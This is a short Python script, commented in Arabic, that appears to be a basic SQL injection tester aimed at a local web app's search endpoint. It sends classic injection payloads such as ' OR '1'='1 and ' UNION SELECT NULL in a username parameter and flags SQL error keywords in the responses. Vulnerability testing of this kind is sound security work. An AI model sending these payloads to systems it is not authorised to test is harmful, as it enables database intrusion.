import requests

# الموقع المستهدف
URL = "http://127.0.0.1:5000/search"

# اختبارات الحقن البسيطة
PAYLOADS = [
    "'",                    # علامة اقتباس فقط (تسبب خطأ غالبًا)
    "\"",                   # اقتباس مزدوج
    "' OR '1'='1",          # منطقي دائم الصحة
    "' AND '1'='2",         # منطقي دائم الخطأ
    "'; --",                # إغلاق + تعليق
    "' UNION SELECT NULL -- ",
]

def test_parameter(param_name, param_value):
    print(f"\n🔍 اختبار المعامل: {param_name}")
    print("=" * 50)
    
    for payload in PAYLOADS:
        params = {param_name: payload}
        try:
            response = requests.get(URL, params=params, timeout=10)
            
            # تحليل الرد
            status = "⚠️ مشبوه!" if any(
                keyword in response.text.lower() 
                for keyword in ["error", "sql", "syntax", "mysql", "warning"]
            ) else "✅ عادي"
            
            print(f"  {status}  البايلود: {payload}")
            print(f"      حجم الرد: {len(response.text)} حرف")
            
        except Exception as e:
            print(f"  ❌ خطأ: {e}")

if __name__ == "__main__":
    test_parameter("username", "admin")